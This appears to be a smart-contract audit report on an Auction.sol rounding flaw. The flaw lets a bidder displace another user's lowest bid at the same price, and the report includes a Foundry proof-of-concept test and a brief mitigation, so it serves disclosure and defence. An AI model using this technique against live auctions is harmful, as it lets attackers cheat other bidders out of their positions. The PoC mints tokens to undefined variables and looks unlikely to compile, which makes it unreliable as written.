# Malicious user could swap the lowest bid with same price.

### Summary

Malicious user could remove other's lowest bid and insert his bid.


### Root Cause

In `bid` function in `Auction.sol`, if `currentCouponAmount` exceeds `totalBuyCouponAmount`, `removeExcessBids` will be called.
As a result, there could be lowest bid and it's `sellCouponAmount` and `buyReserveAmount` could be decrease to make `currentCouponAmount = totalBuyCouponAmount`.

```solidity
    } else {
       // Calculate the proportion of sellAmount being removed
       uint256 proportion = (amountToRemove * 1e18) / sellCouponAmount;
       
       // Reduce the current bid's amounts
       currentBid.sellCouponAmount = sellCouponAmount - amountToRemove;
       currentCouponAmount -= amountToRemove;

       uint256 reserveReduction = ((currentBid.buyReserveAmount * proportion) / 1e18);
       currentBid.buyReserveAmount = currentBid.buyReserveAmount - reserveReduction;
       totalSellReserveAmount -= reserveReduction;
       
       // Refund the proportional sellAmount
       IERC20(buyCouponToken).safeTransfer(currentBid.bidder, amountToRemove);
       
       amountToRemove = 0;
       emit BidReduced(currentIndex, currentBid.bidder, currentBid.buyReserveAmount, currentBid.sellCouponAmount);
     }
```

As a result, the value of  `currentBid.buyReserveAmount/currentBid.sellCouponAmount` could be larger than before due to rounding.
And it will be the lowest price bid. 
Other user can insert bid with the previous lowest bid's `buyReserveAmount` and `sellCouponAmount`.
Consequently, the lowest bid will be removed because `currentCouponAmount` exceeds `totalBuyCouponAmount`, 
Additionally, the `buyReserveAmount` and `sellCouponAmount` of the other users' bids will decrease to match the amount of the removed lowest bid. As a result, this users' bid will effectively become the new lowest bid at the same price.

### PoC

```solidity
contract AuctionTest is Test {
   Auction auction;
   Token usdc;
   Token weth;

   address lowest = address(0x1);
   address malicious = address(0x2);
   address house = address(0x3);

   address pool;

function testSwapLowestBid() public {

    usdc = new Token("USDC", "USDC", false);
    weth = new Token("WETH", "WETH", false);
    
    pool = createPool(address(weth), address(usdc));
    useMockPool(pool);

    vm.startPrank(pool);
    auction = Auction(Utils.deploy(
      address(new Auction()),
      abi.encodeWithSelector(
        Auction.initialize.selector,
        address(usdc),
        address(weth),
        55555555,
        block.timestamp + 10 days,
        1,
        house,
        90
      )
    ));
    vm.stopPrank();
    vm.startPrank(lowest);
    usdc.mint(bidder, 1000 ether);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(100 ether, 99999999); // lowest's `currentCouponAmount` is decreases to 55555555 and will be the lowest price.
    vm.stopPrank();

    vm.startPrank(malicious );
    usdc.mint(bidder2, 1000 ether);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(100 ether, 99999999);//remove the lowest because it is higher price than the lowest before decreasing.
    vm.stopPrank();
  }
```
### Mitigation

Please check if the lowest bid is removed with the same price.
